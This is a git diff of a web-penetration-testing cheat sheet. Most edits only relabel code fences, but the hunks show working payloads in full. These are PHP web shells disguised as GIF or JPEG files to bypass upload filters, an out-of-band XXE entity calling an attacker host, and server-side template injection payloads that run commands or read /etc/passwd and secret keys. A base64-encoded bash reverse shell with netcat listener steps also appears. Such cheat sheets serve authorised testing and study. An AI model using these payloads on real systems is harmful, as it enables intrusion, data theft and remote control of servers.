@@ -238,24 +238,25 @@ data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert
 # Bypass technics
 ### Bypass File Upload Filtering
 
-`GIF89a`
+`.gif`file header
 ```php
 GIF89a;
-<?
+
+<?php
 system($_GET['cmd']);
 ?>
 ```
 
 `exiftool`
 
-```php
+```bash
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
 ```
 
 `magic header`
-```
+```bash
 head -c 20 example.png > magic.php && echo "<?php system($_GET['cmd']);?>" >> magic.php
 ```
 
@@ -313,11 +314,11 @@ X-Forwarded-For: 127.0.0.1 -> 200
 -------------------------------------------------------------------------------------------------------------
 # PHP filters
 
-```
+```php
 php://filter/convert.base64-encode/resource=
 ```
 
-```
+```php
 php://filter/read=string.rot13/resource=
 ```
 
@@ -520,7 +521,7 @@ If the output of the `win.ini` file on the target returns the response message, 
 
 ### XXE - Out-of-band
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]><
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
 ```
 
 ### XXE file read via XInclude payload as parameter value 
@@ -659,17 +660,17 @@ Data:
 
 ## SSTI CheatSheet
 ### `Polyglot`
-```
+```python
 ${{<%[%'"}}%\
 ```
 
 ### `FreeMarker (Java)`
-```
+```java
 ${7*7} = 49
 <#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
 ```
 ### `Java`
-```
+```java
 ${7*7}
 ${{7*7}}
 ${class.getClassLoader()}
@@ -679,14 +680,14 @@ ${T(java.lang.System).getenv()}
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
 ```
 ### `Golang`
-```
+```go
 {{ . }}
 {{.Email}}
 {{.Password}}
 {{ .system "id" }}
 ```
 ### `Twig (PHP)`
-```
+```php
 {{7*7}}
 {{7*'7'}}
 {{dump(app)}}
@@ -735,35 +736,35 @@ $str.valueOf($chr.toChars($out.read()))
 #end
 ```
 ### `ERB (Ruby)`
-```
+```ruby
 <%= system("whoami") %>
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
 ```
 ### `Django Tricks (Python)`
-```
+```python
 {% debug %}
 {{settings.SECRET_KEY}}
 ```
 ### `Tornado (Python)`
-```
+```python
 {% import foobar %} = Error
 {% import os %}{{os.system('whoami')}}
 ```
 ### `Mojolicious (Perl)`
-```
+```perl
 <%= perl code %>
 <% perl code %>
 ```
 ### `Flask/Jinja2: Identify`
-```
+```python
 {{ '7'*7 }}
 {{ [].class.base.subclasses() }} # get all classes
 {{''.class.mro()[1].subclasses()}}
 {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
 ```
 ### `Flask/Jinja2` 
-```
+```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 ### `Jade`
@@ -798,7 +799,7 @@ echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
 c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
 ```
 #### [4] now start a listener
-```
+```bash
 nc -lvvp 4444
 ```
 
@@ -808,7 +809,7 @@ nc -lvvp 4444
 ```
 
 #### [6] if everything works currectly. You should get a reverse shell.
-```shell
+```bash
 nc -vv -lnp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
